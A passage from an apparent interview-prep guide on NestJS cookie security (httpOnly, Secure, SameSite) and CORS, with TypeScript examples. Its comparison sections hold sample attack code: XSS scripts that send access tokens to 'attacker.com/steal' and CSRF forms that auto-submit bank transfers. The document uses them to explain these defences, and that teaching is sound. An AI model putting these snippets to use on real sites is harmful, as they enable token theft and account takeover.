        return req?.cookies?.access_token;
      },
      ignoreExpiration: false,
      secretOrKey: process.env.JWT_SECRET,
    });
  }

  async validate(payload: any) {
    return { userId: payload.sub, email: payload.email };
  }
}

// 7. Complete Secure Cookie Configuration
const secureCookieOptions = {
  httpOnly: true,      // ✅ Prevents XSS access
  secure: true,        // ✅ HTTPS only
  sameSite: 'strict',  // ✅ Prevents CSRF
  maxAge: 900000,      // 15 minutes (in milliseconds)
  domain: '.example.com', // Share across subdomains
  path: '/',           // Available on all paths
};

// Usage
response.cookie('access_token', token, secureCookieOptions);

// 8. XSS Attack Comparison
const xssAttackComparison = {
  localStorage: {
    vulnerable: '❌ YES',
    attack: `
      // Malicious script injected via XSS
      <script>
        const token = localStorage.getItem('access_token');
        fetch('https://attacker.com/steal?token=' + token);
      </script>
    `,
    impact: 'Token stolen, attacker can impersonate user',
  },
  regularCookie: {
    vulnerable: '❌ YES',
    attack: `
      // Malicious script can read cookie
      <script>
        const token = document.cookie.match(/access_token=([^;]+)/)[1];
        fetch('https://attacker.com/steal?token=' + token);
      </script>
    `,
    impact: 'Token stolen, attacker can impersonate user',
  },
  httpOnlyCookie: {
    vulnerable: '✅ NO',
    attack: `
      // Malicious script CANNOT access httpOnly cookie
      <script>
        console.log(document.cookie); // Won't show httpOnly cookies
        // Attack fails!
      </script>
    `,
    impact: 'Token protected, attack prevented',
  },
};

// 9. Clearing httpOnly Cookies
@Post('logout')
logout(@Res({ passthrough: true }) response: Response) {
  // Clear httpOnly cookie
  response.clearCookie('access_token', {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
  });
  
  return { message: 'Logged out successfully' };
}

// 10. Frontend Usage (No Manual Token Handling)
/*
// Login
await fetch('http://localhost:3000/auth/login', {
  method: 'POST',
  credentials: 'include', // Include cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});

// Protected request (cookies sent automatically)
const response = await fetch('http://localhost:3000/profile', {
  credentials: 'include', // Include httpOnly cookies
});

// Logout
await fetch('http://localhost:3000/auth/logout', {
  method: 'POST',
  credentials: 'include',
});
*/

// 11. CORS Configuration (Required for Cookies)
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Enable cookie parser
  app.use(cookieParser());

  // CORS with credentials
  app.enableCors({
    origin: 'http://localhost:3001', // Frontend URL
    credentials: true, // Allow cookies
  });

  await app.listen(3000);
}

// 12. httpOnly Best Practices
const httpOnlyBestPractices = {
  when: {
    ✅: [
      'Storing JWT access tokens',
      'Storing refresh tokens',
      'Session IDs',
      'Any sensitive authentication data',
    ],
    ❌: [
      'User preferences (theme, language)',
      'Analytics data',
      'Non-sensitive UI state',
    ],
  },
  security: {
    ✅: [
      'Always use httpOnly for tokens',
      'Combine with secure flag (HTTPS)',
      'Combine with sameSite (CSRF protection)',
      'Set appropriate maxAge',
    ],
    ❌: [
      'Never store sensitive data without httpOnly',
      'Don\'t use for non-HTTPS in production',
      'Don\'t forget CORS credentials: true',
    ],
  },
  limitations: {
    note: 'httpOnly protects from XSS, but...',
    doesNotProtect: [
      'CSRF attacks (use sameSite + CSRF tokens)',
      'Man-in-the-middle (use secure flag + HTTPS)',
      'Physical access to machine',
    ],
    mustCombine: [
      'httpOnly (XSS protection)',
      'secure (HTTPS only)',
      'sameSite (CSRF protection)',
    ],
  },
};

// 13. Testing httpOnly Cookies
describe('httpOnly Cookies', () => {
  it('should set httpOnly cookie on login', async () => {
    const response = await request(app.getHttpServer())
      .post('/auth/login')
      .send({ email: 'test@example.com', password: 'password' })
      .expect(200);

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).toMatch(/access_token/);
    expect(cookies[0]).toMatch(/HttpOnly/);
  });

  it('should send httpOnly cookie with requests', async () => {
    // Login first
    const loginResponse = await request(app.getHttpServer())
      .post('/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookie = loginResponse.headers['set-cookie'];

    // Use cookie in subsequent request
    await request(app.getHttpServer())
      .get('/profile')
      .set('Cookie', cookie)
      .expect(200);
  });
});

// 14. Complete Security Stack
@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Body() dto: LoginDto, @Res({ passthrough: true }) res: Response) {
    const tokens = await this.authService.login(dto);

    // Access token: short-lived, httpOnly
    res.cookie('access_token', tokens.access_token, {
      httpOnly: true,     // ✅ XSS protection
      secure: true,       // ✅ HTTPS only
      sameSite: 'strict', // ✅ CSRF protection
      maxAge: 15 * 60 * 1000, // 15 min
    });

    // Refresh token: long-lived, httpOnly
    res.cookie('refresh_token', tokens.refresh_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
      path: '/auth/refresh', // Only sent to refresh endpoint
    });

    return { message: 'Logged in successfully' };
  }
}
```

**Interview Tip**: **httpOnly = true** prevents JavaScript from accessing cookie via `document.cookie`. **Security**: Protects against XSS attacks (malicious scripts can't steal tokens). **Usage**: Set in NestJS with `response.cookie('token', value, { httpOnly: true })`, cookies sent automatically with `credentials: 'include'`. **Must combine**: httpOnly (XSS protection), secure (HTTPS only), sameSite (CSRF protection). **Limitations**: Doesn't protect from CSRF (need sameSite + CSRF tokens) or MITM (need HTTPS). **Production**: Always use httpOnly for JWT tokens, never for non-sensitive data like theme preferences.

</details>

10. What is the secure flag in cookies?

<details>
<summary><strong>Answer</strong></summary>

**Secure Flag**: Cookie with **secure = true** is **only sent over HTTPS**, never HTTP. **Security**: Prevents **man-in-the-middle (MITM)** attacks from intercepting tokens over insecure connections. **Use**: Always enable in production, can disable in local development (http://localhost). **Combination**: Use with httpOnly + sameSite for complete protection. **Production**: Always secure = true + enforce HTTPS.

```typescript
// Secure Flag in Cookies - Complete Guide

// 1. What is Secure Flag?
const secureFlag Definition = {
  secure: true, // Cookie only sent over HTTPS
  purpose: 'Prevent MITM attacks on insecure HTTP',
  behavior: {
    https: '✅ Cookie sent',
    http: '❌ Cookie NOT sent',
  },
};

// 2. Setting Secure Cookie in NestJS
import { Controller, Post, Res } from '@nestjs/common';
import { Response } from 'express';

@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Body() dto: LoginDto, @Res({ passthrough: true }) response: Response) {
    const { access_token } = await this.authService.login(dto);

    // Set secure cookie
    response.cookie('access_token', access_token, {
      httpOnly: true,
      secure: true,         // ✅ HTTPS only
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
    });

    return { message: 'Logged in' };
  }
}

// 3. Without Secure Flag (VULNERABLE)
// ❌ Cookie sent over HTTP (insecure)
response.cookie('access_token', access_token, {
  httpOnly: true,
  secure: false, // or omitted
});

/*
HTTP Request:
GET /profile HTTP/1.1
Host: example.com
Cookie: access_token=eyJhbGc...  ← Transmitted in plaintext!

MITM Attacker can intercept and steal token
*/

// 4. With Secure Flag (PROTECTED)
// ✅ Cookie only sent over HTTPS
response.cookie('access_token', access_token, {
  httpOnly: true,
  secure: true, // HTTPS only
});

/*
HTTPS Request:
GET /profile HTTP/1.1
Host: example.com
Cookie: access_token=eyJhbGc...  ← Encrypted by TLS!

MITM Attacker cannot read encrypted traffic
*/

// 5. Environment-Based Configuration
// config/cookie.config.ts
export const getCookieOptions = () => {
  const isProduction = process.env.NODE_ENV === 'production';
  
  return {
    httpOnly: true,
    secure: isProduction, // true in production, false in development
    sameSite: 'strict' as const,
    maxAge: 15 * 60 * 1000,
  };
};

// Usage
@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Res({ passthrough: true }) res: Response) {
    const token = await this.authService.login();
    res.cookie('access_token', token, getCookieOptions());
    return { message: 'Logged in' };
  }
}

// 6. Development vs Production
const cookieConfiguration = {
  development: {
    environment: 'http://localhost:3000',
    secure: false, // Allow HTTP for local development
    reason: 'Local dev typically uses HTTP',
    config: {
      httpOnly: true,
      secure: false,
      sameSite: 'lax',
    },
  },
  production: {
    environment: 'https://api.example.com',
    secure: true, // HTTPS only
    reason: 'Production must use HTTPS',
    config: {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
    },
  },
};

// 7. Complete Secure Cookie Stack
@Injectable()
export class CookieService {
  setAuthCookie(response: Response, token: string) {
    const isProduction = process.env.NODE_ENV === 'production';
    
    response.cookie('access_token', token, {
      httpOnly: true,       // ✅ XSS protection
      secure: isProduction, // ✅ HTTPS only (production)
      sameSite: 'strict',   // ✅ CSRF protection
      maxAge: 15 * 60 * 1000,
      domain: process.env.COOKIE_DOMAIN, // e.g., '.example.com'
      path: '/',
    });
  }
  
  clearAuthCookie(response: Response) {
    response.clearCookie('access_token', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
    });
  }
}

// 8. MITM Attack Comparison
const mitmAttackComparison = {
  httpWithoutSecure: {
    vulnerable: '❌ YES',
    scenario: `
      // User on public WiFi (HTTP)
      User → [Public WiFi] → Server
              ↑
           Attacker can intercept
    `,
    attack: `
      # Attacker uses tools like Wireshark
      GET /profile HTTP/1.1
      Cookie: access_token=eyJhbGc...  ← Visible in plaintext!
    `,
    impact: 'Token stolen, account compromised',
  },
  httpsWithSecure: {
    vulnerable: '✅ NO',
    scenario: `
      // User on public WiFi (HTTPS)
      User → [Public WiFi] → Server
              ↑
           Attacker sees encrypted traffic
    `,
    attack: `
      # Attacker captures encrypted traffic
      [Encrypted TLS handshake]
      [Encrypted request with cookie]
      Cannot decrypt without private key
    `,
    impact: 'Token protected, attack prevented',
  },
};

// 9. Enforcing HTTPS in Production
// main.ts
import { NestFactory } from '@nestjs/core';
import * as helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Force HTTPS redirect (production only)
  if (process.env.NODE_ENV === 'production') {
    app.use((req, res, next) => {
      if (req.header('x-forwarded-proto') !== 'https') {
        res.redirect(`https://${req.header('host')}${req.url}`);
      } else {
        next();
      }
    });
  }

  // Helmet with HSTS (force HTTPS)
  app.use(helmet({
    hsts: {
      maxAge: 31536000,      // 1 year
      includeSubDomains: true,
      preload: true,
    },
  }));

  await app.listen(3000);
}

// 10. Cookie Security Flags Comparison
const cookieSecurityFlags = {
  httpOnly: {
    purpose: 'Prevent XSS attacks',
    protectsFrom: 'Malicious JavaScript accessing cookie',
    example: 'document.cookie cannot read',
  },
  secure: {
    purpose: 'Prevent MITM attacks',
    protectsFrom: 'Intercepting cookies over HTTP',
    example: 'Cookie only sent over HTTPS',
  },
  sameSite: {
    purpose: 'Prevent CSRF attacks',
    protectsFrom: 'Cross-site request forgery',
    example: 'Cookie not sent with cross-origin requests',
    values: {
      strict: 'Never send cross-origin',
      lax: 'Send with top-level navigation',
      none: 'Always send (requires secure)',
    },
  },
};

// 11. All Flags Combined (Maximum Security)
const maximumSecurityCookie = {
  httpOnly: true,       // ✅ XSS protection
  secure: true,         // ✅ MITM protection
  sameSite: 'strict',   // ✅ CSRF protection
  maxAge: 900000,       // 15 minutes
  domain: '.example.com', // Subdomain sharing
  path: '/',            // All paths
};

response.cookie('access_token', token, maximumSecurityCookie);

// 12. Testing Secure Cookies
describe('Secure Cookies', () => {
  it('should set secure flag in production', () => {
    process.env.NODE_ENV = 'production';
    
    const response = request(app.getHttpServer())
      .post('/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).toMatch(/Secure/);
  });

  it('should not set secure flag in development', () => {
    process.env.NODE_ENV = 'development';
    
    const response = request(app.getHttpServer())
      .post('/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).not.toMatch(/Secure/);
  });
});

// 13. Security Best Practices
const secureFlagBestPractices = {
  production: {
    ✅: [
      'Always secure = true',
      'Enforce HTTPS (redirect HTTP → HTTPS)',
      'Use HSTS header',
      'Get SSL certificate (Let\'s Encrypt)',
    ],
    ❌: [
      'Never use HTTP in production',
      'Don\'t skip SSL certificate',
      'Don\'t allow mixed content (HTTP + HTTPS)',
    ],
  },
  development: {
    ✅: [
      'secure = false for localhost',
      'Use environment variable',
      'Test with HTTPS locally (mkcert)',
    ],
    ❌: [
      'Don\'t hardcode secure = true (breaks localhost)',
      'Don\'t skip testing HTTPS behavior',
    ],
  },
  deployment: {
    checklist: [
      '✅ HTTPS enabled',
      '✅ SSL certificate valid',
      '✅ secure = true in cookies',
      '✅ HSTS header enabled',
      '✅ HTTP redirects to HTTPS',
      '✅ No mixed content warnings',
    ],
  },
};

// 14. SSL/TLS Certificate Setup
// Using Let's Encrypt (Free)
/*
# Install certbot
sudo apt-get install certbot

# Get certificate
sudo certbot certonly --standalone -d example.com

# Auto-renewal
sudo certbot renew --dry-run
*/

// NestJS with HTTPS
import * as fs from 'fs';
import * as https from 'https';

async function bootstrap() {
  const httpsOptions = {
    key: fs.readFileSync('./secrets/private-key.pem'),
    cert: fs.readFileSync('./secrets/public-certificate.pem'),
  };

  const app = await NestFactory.create(AppModule, { httpsOptions });
  await app.listen(443); // HTTPS port
}

// 15. Complete Production Setup
@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Body() dto: LoginDto, @Res({ passthrough: true }) res: Response) {
    const tokens = await this.authService.login(dto);

    // Production-ready cookie
    res.cookie('access_token', tokens.access_token, {
      httpOnly: true,                    // ✅ XSS protection
      secure: true,                      // ✅ HTTPS only
      sameSite: 'strict',                // ✅ CSRF protection
      maxAge: 15 * 60 * 1000,           // 15 minutes
      domain: process.env.COOKIE_DOMAIN, // '.example.com'
      path: '/',
    });

    return { message: 'Logged in successfully' };
  }
}
```

**Interview Tip**: **secure = true** ensures cookies only sent over **HTTPS**, never HTTP. **Security**: Prevents MITM attacks from intercepting tokens on insecure connections. **Configuration**: Enable in production (HTTPS), can disable in local dev (http://localhost). **Must combine**: httpOnly (XSS), secure (MITM), sameSite (CSRF) for complete protection. **Production**: Always secure = true + enforce HTTPS redirect + HSTS header + valid SSL certificate. **Deployment checklist**: HTTPS enabled, secure flag set, HTTP redirects to HTTPS, HSTS active.

</details>
11. What is SameSite attribute in cookies?

<details>
<summary><strong>Answer</strong></summary>

**SameSite**: Cookie attribute controlling **cross-site request** behavior. **Values**: **Strict** (never send cross-origin), **Lax** (send with top-level navigation), **None** (always send, requires Secure). **Security**: Prevents **CSRF attacks** by restricting when cookies are sent. **Recommendation**: Use **Strict** for auth cookies, **Lax** for general cookies. **Production**: SameSite=Strict + CSRF tokens for maximum security.

```typescript
// SameSite Attribute - Complete Guide

// 1. SameSite Values
const sameSiteOptions = {
  strict: {
    value: 'strict',
    behavior: 'Cookie NEVER sent with cross-origin requests',
    security: '✅ Maximum CSRF protection',
    use: 'Authentication cookies',
    example: 'User on attacker.com → request to yoursite.com (cookie NOT sent)',
  },
  lax: {
    value: 'lax',
    behavior: 'Cookie sent with top-level navigation (GET), NOT with AJAX',
    security: '⚠️ Partial CSRF protection',
    use: 'General cookies (themes, preferences)',
    example: 'User clicks link → yoursite.com (cookie sent), AJAX → yoursite.com (cookie NOT sent)',
  },
  none: {
    value: 'none',
    behavior: 'Cookie always sent with cross-origin requests',
    security: '❌ No CSRF protection',
    use: 'Third-party cookies, embeds',
    requires: 'Secure flag (HTTPS)',
    example: 'iframe.com embeds yoursite.com (cookie sent)',
  },
};

// 2. Setting SameSite in NestJS
import { Controller, Post, Res } from '@nestjs/common';
import { Response } from 'express';

@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Body() dto: LoginDto, @Res({ passthrough: true }) response: Response) {
    const { access_token } = await this.authService.login(dto);

    // SameSite=Strict (maximum security)
    response.cookie('access_token', access_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict', // ✅ CSRF protection
      maxAge: 15 * 60 * 1000,
    });

    return { message: 'Logged in' };
  }
}

// 3. CSRF Attack Comparison
const csrfAttackComparison = {
  withoutSameSite: {
    vulnerable: '❌ YES',
    scenario: `
      // User logged into bank.com
      // Visits attacker.com
      
      <!-- attacker.com -->
      <form action="https://bank.com/transfer" method="POST">
        <input name="to" value="attacker" />
        <input name="amount" value="1000" />
      </form>
      <script>document.forms[0].submit();</script>
      
      // Cookie sent with request (user's session)
      // Money transferred to attacker!
    `,
    impact: 'CSRF attack successful',
  },
  withSameSiteStrict: {
    vulnerable: '✅ NO',
    scenario: `
      // Same attack attempt
      
      <!-- attacker.com -->
      <form action="https://bank.com/transfer" method="POST">
        <input name="to" value="attacker" />
        <input name="amount" value="1000" />
      </form>
      <script>document.forms[0].submit();</script>
      
      // Cookie NOT sent (different site)
      // Request fails (unauthorized)
      // Attack prevented!
    `,
    impact: 'CSRF attack blocked',
  },
};

// 4. SameSite Values Detailed Examples
@Controller('auth')
export class AuthController {
  // Strict: Maximum security
  @Post('login')
  async loginStrict(@Res({ passthrough: true }) res: Response) {
    res.cookie('session', 'abc123', {
      sameSite: 'strict', // Never send cross-origin
    });
    /*
    ✅ yoursite.com → yoursite.com (same-site)
    ❌ attacker.com → yoursite.com (cross-site)
    ❌ google.com → yoursite.com (cross-site)
    */
  }

  // Lax: Balanced security
  @Post('login-lax')
  async loginLax(@Res({ passthrough: true }) res: Response) {
    res.cookie('session', 'abc123', {
      sameSite: 'lax', // Send with top-level navigation
    });
    /*
    ✅ yoursite.com → yoursite.com (same-site)
    ✅ google.com → yoursite.com (top-level GET, e.g., link click)
    ❌ google.com → yoursite.com (AJAX POST)
    ❌ attacker.com → yoursite.com (POST form)
    */
  }

  // None: No protection
  @Post('login-none')
  async loginNone(@Res({ passthrough: true }) res: Response) {
    res.cookie('session', 'abc123', {
      sameSite: 'none',
      secure: true, // REQUIRED with SameSite=None
    });
    /*
    ✅ yoursite.com → yoursite.com
    ✅ attacker.com → yoursite.com (all requests)
    ⚠️ No CSRF protection (use CSRF tokens!)
    */
  }
}

// 5. Decision Matrix
const sameSiteDecisionMatrix = {
  authCookies: {
    value: 'strict',
    reason: 'Maximum CSRF protection for sensitive operations',
    tradeoff: 'Users must navigate directly to your site',
  },
  generalCookies: {
    value: 'lax',
    reason: 'Balance security and usability',
    tradeoff: 'Works with external links',
  },
  thirdPartyCookies: {
    value: 'none',
    reason: 'Required for cross-site embeds (iframes)',
    tradeoff: 'Must use HTTPS and implement CSRF tokens',
  },
};

// 6. Complete Secure Cookie Configuration
const productionCookieConfig = {
  // Access token (strict)
  accessToken: {
    httpOnly: true,        // ✅ XSS protection
    secure: true,          // ✅ HTTPS only
    sameSite: 'strict',    // ✅ CSRF protection
    maxAge: 15 * 60 * 1000,
    path: '/',
  },
  
  // Refresh token (strict, limited path)
  refreshToken: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000,
    path: '/auth/refresh', // Only sent to refresh endpoint
  },
  
  // Preference cookie (lax)
  preferences: {
    httpOnly: false,       // JavaScript can access
    secure: true,
    sameSite: 'lax',       // Allow external links
    maxAge: 365 * 24 * 60 * 60 * 1000,
  },
};

// 7. SameSite with CORS
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // CORS configuration
  app.enableCors({
    origin: 'https://frontend.com', // Specific origin
    credentials: true, // Allow cookies
  });

  // Cookies with SameSite
  app.use((req, res, next) => {
    res.cookie('test', 'value', {
      sameSite: 'none',  // Required for cross-origin
      secure: true,       // Required with SameSite=None
    });
    next();
  });

  await app.listen(3000);
}

// 8. Browser Behavior (Modern Browsers)
const browserDefaults = {
  chrome80plus: {
    default: 'lax',
    note: 'SameSite=Lax by default if not specified',
  },
  firefox69plus: {
    default: 'lax',
    note: 'SameSite=Lax by default',
  },
  safari13plus: {
    default: 'none',
    note: 'Different behavior than Chrome/Firefox',
  },
  recommendation: 'Always explicitly set SameSite',
};

// 9. Migration Guide (None → Lax → Strict)
@Injectable()
export class CookieService {
  setSessionCookie(response: Response, token: string) {
    const config = {
      httpOnly: true,
      secure: true,
      maxAge: 15 * 60 * 1000,
    };

    // Phase 1: Start with None (if currently unset)
    // response.cookie('session', token, { ...config, sameSite: 'none' });

    // Phase 2: Upgrade to Lax (test for 1-2 weeks)
    // response.cookie('session', token, { ...config, sameSite: 'lax' });

    // Phase 3: Upgrade to Strict (maximum security)
    response.cookie('session', token, { ...config, sameSite: 'strict' });
  }
}

// 10. Common Scenarios
const commonScenarios = {
  regularWebApp: {
    scenario: 'Users navigate to your site directly',
    sameSite: 'strict',
    example: 'User types yoursite.com or clicks bookmark',
  },
  oauth: {
    scenario: 'OAuth redirect from provider',
    sameSite: 'lax',
    example: 'Google OAuth redirects back to your site',
    note: 'Strict would block OAuth callback',
  },
  embeddedWidget: {
    scenario: 'Your widget embedded in other sites',
    sameSite: 'none',
    example: 'Chat widget, payment form',
    requires: 'secure + CSRF tokens',
  },
  apiOnly: {
    scenario: 'API consumed by separate frontend',
    sameSite: 'none',
    cors: true,
    example: 'React SPA on different domain',
  },
};

// 11. Testing SameSite
describe('SameSite Cookie', () => {
  it('should set SameSite=Strict for auth', async () => {
    const response = await request(app.getHttpServer())
      .post('/auth/login')
      .send({ email: 'test@example.com', password: 'password' });

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).toMatch(/SameSite=Strict/);
  });

  it('should set SameSite=Lax for preferences', async () => {
    const response = await request(app.getHttpServer())
      .post('/preferences')
      .send({ theme: 'dark' });

    const cookies = response.headers['set-cookie'];
    expect(cookies[0]).toMatch(/SameSite=Lax/);
  });
});

// 12. Security Best Practices
const sameSiteBestPractices = {
  authentication: {
    ✅: [
      'Use SameSite=Strict for auth cookies',
      'Combine with httpOnly + secure',
      'Add CSRF tokens for forms',
      'Validate origin header',
    ],
    ❌: [
      'Don\'t use SameSite=None for auth',
      'Don\'t rely on SameSite alone',
      'Don\'t forget Secure flag with None',
    ],
  },
  api: {
    ✅: [
      'SameSite=None for cross-origin APIs',
      'Require HTTPS (secure flag)',
      'Implement CSRF tokens',
      'Validate origin/referer headers',
    ],
  },
  migration: {
    steps: [
      '1. Audit current cookies',
      '2. Set explicit SameSite values',
      '3. Test with Lax first',
      '4. Upgrade to Strict where possible',
      '5. Monitor for issues',
    ],
  },
};

// 13. Combined Security Stack
@Controller('auth')
export class SecureAuthController {
  @Post('login')
  async login(@Body() dto: LoginDto, @Res({ passthrough: true }) res: Response) {
    const tokens = await this.authService.login(dto);

    // Maximum security configuration
    res.cookie('access_token', tokens.access_token, {
      httpOnly: true,       // ✅ XSS protection (JavaScript can't access)
      secure: true,         // ✅ HTTPS only (MITM protection)
      sameSite: 'strict',   // ✅ CSRF protection (cross-site blocked)
      maxAge: 15 * 60 * 1000, // 15 minutes
      domain: process.env.COOKIE_DOMAIN,
      path: '/',
    });

    // Refresh token (longer lived, restricted path)
    res.cookie('refresh_token', tokens.refresh_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
      path: '/auth/refresh', // Only sent to refresh endpoint
    });

    return { message: 'Logged in successfully' };
  }
}

// 14. Troubleshooting
const troubleshooting = {
  cookieNotSent: {
    symptom: 'Cookie not included in cross-origin requests',
    cause: 'SameSite=Strict or Lax blocking',
    solution: 'Use SameSite=None + Secure flag + CORS credentials',
  },
  oauthBroken: {
    symptom: 'OAuth callback fails',
    cause: 'SameSite=Strict blocking OAuth redirect',
    solution: 'Use SameSite=Lax for OAuth cookies',
  },
  chromeWarning: {
    symptom: 'Chrome console warning about SameSite',
    cause: 'SameSite=None without Secure flag',
    solution: 'Add secure: true',
  },
};
```

**Interview Tip**: **SameSite** controls cross-site cookie behavior. **Strict** = never send cross-origin (maximum CSRF protection), **Lax** = send with top-level navigation (balanced), **None** = always send (requires Secure + HTTPS). **Security**: Prevents CSRF attacks by blocking cross-site requests. **Recommendation**: Strict for auth cookies, Lax for general cookies, None only if needed (e.g., embeds) with CSRF tokens. **Must combine**: httpOnly (XSS) + secure (HTTPS) + sameSite (CSRF). **Production**: SameSite=Strict + CSRF tokens for maximum security.

</details>

## CORS (Cross-Origin Resource Sharing)

12. What is CORS and why is it important?

<details>
<summary><strong>Answer</strong></summary>

**CORS**: Browser security mechanism controlling **cross-origin HTTP requests**. **Purpose**: Prevents malicious sites from accessing your API. **How**: Browser checks `Access-Control-Allow-Origin` header before sending requests. **Same-Origin**: Protocol + Domain + Port must match. **Important**: Protects users from unauthorized data access, prevents CSRF-like attacks. **NestJS**: Use `app.enableCors()` to configure.

```typescript
// CORS - Complete Guide

// 1. What is Same-Origin Policy?
const sameOriginExamples = {
  sameOrigin: {
    base: 'https://example.com:443/page1',
    allowed: [
      'https://example.com:443/page2',  // ✅ Same protocol, domain, port
      'https://example.com:443/api/users', // ✅ Different path (OK)
    ],
    blocked: [
      'http://example.com:443',         // ❌ Different protocol
      'https://api.example.com:443',    // ❌ Different subdomain
      'https://example.com:3000',       // ❌ Different port
      'https://example.net:443',        // ❌ Different domain
    ],
  },
};

// 2. Why CORS is Important
const corsImportance = {
  problem: `
    // Without CORS:
    // User visits attacker.com
    // attacker.com makes request to bank.com/api/transfer
    // Browser sends user's cookies with request
    // Money transferred without user's knowledge!
  `,
  solution: `
    // With CORS:
    // Browser checks bank.com's CORS policy
    // bank.com doesn't allow attacker.com origin
    // Browser blocks the request
    // Attack prevented!
  `,
};

// 3. CORS Request Flow
const corsRequestFlow = {
  step1: {
    action: 'Frontend makes cross-origin request',
    example: 'https://frontend.com → https://api.example.com/users',
  },
  step2: {
    action: 'Browser sends preflight request (OPTIONS)',
    headers: {
      'Origin': 'https://frontend.com',
      'Access-Control-Request-Method': 'POST',
      'Access-Control-Request-Headers': 'Content-Type, Authorization',
    },
  },
  step3: {
    action: 'Server responds with CORS headers',
    headers: {
      'Access-Control-Allow-Origin': 'https://frontend.com',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Allow-Credentials': 'true',
    },
  },
  step4: {
    action: 'Browser checks if origin is allowed',
    result: 'Allow or block request',
  },
  step5: {
    action: 'If allowed, browser sends actual request',
  },
};

// 4. Enabling CORS in NestJS
// main.ts
import { NestFactory } from '@nestjs/core';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Simple CORS (allow all origins - DEVELOPMENT ONLY)
  app.enableCors();

  // Production CORS (specific origin)
  app.enableCors({
    origin: 'https://frontend.com',
    credentials: true,
  });

  await app.listen(3000);
}

// 5. CORS Configuration Options
// main.ts
app.enableCors({
  origin: 'https://frontend.com',    // Allowed origin
  methods: ['GET', 'POST', 'PUT', 'DELETE'], // Allowed HTTP methods
  allowedHeaders: ['Content-Type', 'Authorization'], // Allowed headers
  credentials: true,                  // Allow cookies
  preflightContinue: false,           // End preflight here
  optionsSuccessStatus: 204,          // Preflight response status
  maxAge: 3600,                       // Cache preflight for 1 hour
});

// 6. Multiple Origins
app.enableCors({
  origin: [
    'https://frontend.com',
    'https://admin.frontend.com',
    'https://mobile.frontend.com',
  ],
  credentials: true,
});

// 7. Dynamic Origin (Function)
app.enableCors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://frontend.com',
      'https://admin.frontend.com',
    ];
    
    // Allow requests with no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
});

// 8. Environment-Based Configuration
// config/cors.config.ts
export const getCorsConfig = () => {
  if (process.env.NODE_ENV === 'development') {
    return {
      origin: true, // Allow all origins in development
      credentials: true,
    };
  }

  return {
    origin: process.env.ALLOWED_ORIGINS?.split(',') || [],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  };
};

// main.ts
import { getCorsConfig } from './config/cors.config';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  app.enableCors(getCorsConfig());
  await app.listen(3000);
}

// 9. CORS Attack Example
const corsAttackExample = {
  withoutCORS: {
    attack: `
      <!-- attacker.com -->
      <script>
        fetch('https://api.bank.com/transfer', {
          method: 'POST',
          credentials: 'include', // Send cookies
          body: JSON.stringify({
            to: 'attacker',
            amount: 1000
          })
        });
      </script>
      
      // Without CORS, request might succeed
      // User's money transferred to attacker
    `,
    vulnerable: true,
  },
  withCORS: {
    protection: `
      // Browser checks CORS policy
      // api.bank.com only allows bank.com origin
      // Browser blocks attacker.com request
      // Attack prevented!
    `,
    vulnerable: false,
  },
};

// 10. Preflight Request (OPTIONS)
@Controller('users')
export class UsersController {
  // Browser automatically sends OPTIONS request for:
  // - POST/PUT/DELETE
  // - Custom headers (Authorization)
  // - Content-Type: application/json
  
  @Post()
  create(@Body() dto: CreateUserDto) {
    return this.usersService.create(dto);
  }
  
  /*
  Preflight Request:
  OPTIONS /users HTTP/1.1
  Origin: https://frontend.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, Authorization
  
  Preflight Response:
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: https://frontend.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Allow-Credentials: true
  Access-Control-Max-Age: 3600
  
  Actual Request:
  POST /users HTTP/1.1
  Origin: https://frontend.com
  Content-Type: application/json
  Authorization: Bearer eyJhbGc...
  */
}

// 11. CORS with Credentials (Cookies)
app.enableCors({
  origin: 'https://frontend.com', // Must be specific (not *)
  credentials: true,               // Allow cookies
});

// Frontend must include credentials
/*
fetch('https://api.example.com/users', {
  credentials: 'include', // Send cookies
});
*/

// 12. CORS Security Best Practices
const corsBestPractices = {
  production: {
    ✅: [
      'Specify exact origins (not *)',
      'Use environment variables for origins',
      'Enable credentials only if needed',
      'Limit allowed methods',
      'Validate origin on server',
    ],
    ❌: [
      'Never use origin: * with credentials: true',
